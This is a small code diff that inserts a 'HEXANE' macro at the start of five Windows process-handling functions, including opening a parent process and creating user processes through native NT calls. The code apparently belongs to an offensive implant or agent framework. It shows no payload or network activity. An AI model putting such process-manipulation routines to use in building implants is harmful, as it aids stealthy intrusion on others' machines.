@@ -2,6 +2,7 @@
 namespace Process {
 
 	ULONG GetProcessIdByName(const char *name) {
+		HEXANE;
 
 		PROCESSENTRY32 entry = { };
 		HANDLE snap = { };
@@ -25,6 +26,7 @@ namespace Process {
 	}
 
 	HANDLE OpenParentProcess(const char *name) {
+		HEXANE;
 
         PROCESSENTRY32 entry = { };
 		HANDLE process	= { };
@@ -48,6 +50,7 @@ namespace Process {
 	}
 
 	NTSTATUS NtOpenProcess(void **pp_process, uint32_t access, uint32_t pid) {
+		HEXANE;
 
 		OBJECT_ATTRIBUTES attrs = { };
 		CLIENT_ID client		= { };
@@ -60,6 +63,7 @@ namespace Process {
 	}
 
 	VOID CloseUserProcess(_executable *image) {
+		HEXANE;
 
 		if (image->attrs) 	{ Ctx->nt.RtlFreeHeap(image->heap, 0, image->attrs); image->attrs = nullptr; }
 		if (image->heap) 	{ Ctx->nt.RtlDestroyHeap(image->heap); image->heap = nullptr; }
@@ -68,6 +72,7 @@ namespace Process {
 	}
 
 	VOID CreateUserProcess(_executable *image, const char *path) {
+		HEXANE;
 
 		LPWSTR w_name			= { };
 		UNICODE_STRING u_name	= { };
